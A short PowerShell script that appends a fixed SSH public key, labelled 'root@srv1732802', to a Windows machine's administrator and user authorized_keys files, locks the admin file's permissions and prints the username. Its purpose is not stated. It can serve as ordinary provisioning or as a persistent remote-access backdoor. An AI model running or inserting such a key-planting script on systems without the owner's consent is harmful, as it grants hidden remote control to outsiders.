$k = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd8yApmWseURmvOTMhaHqZPaH68nYlDxcdzBkJfuXhl root@srv1732802"
$admin = "$env:ProgramData\ssh\administrators_authorized_keys"
$user  = "$env:USERPROFILE\.ssh\authorized_keys"
New-Item -ItemType Directory -Force -Path (Split-Path $user) | Out-Null
foreach ($f in @($admin, $user)) {
  try {
    if (!(Test-Path $f)) { New-Item -ItemType File -Force -Path $f | Out-Null }
    if (!(Select-String -Path $f -SimpleMatch $k -Quiet)) { Add-Content -Path $f -Value $k }
    Write-Host "OK: $f"
  } catch { Write-Host "skip: $f" }
}
icacls $admin /inheritance:r /grant "Administrators:F" /grant "SYSTEM:F" | Out-Null
Write-Host "USER: $env:USERNAME"
